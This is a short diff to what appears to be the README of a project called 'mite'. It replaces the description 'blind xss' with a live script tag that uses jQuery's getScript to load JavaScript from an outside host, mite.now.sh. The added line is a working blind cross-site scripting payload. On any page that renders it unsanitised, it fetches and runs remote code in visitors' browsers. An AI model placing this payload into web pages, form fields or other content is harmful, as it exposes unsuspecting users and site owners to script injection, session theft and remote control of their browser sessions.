@@ -1,2 +1,4 @@
 # mite
-blind xss
+
+
+<script>$.getScript("https://mite.now.sh")</script>
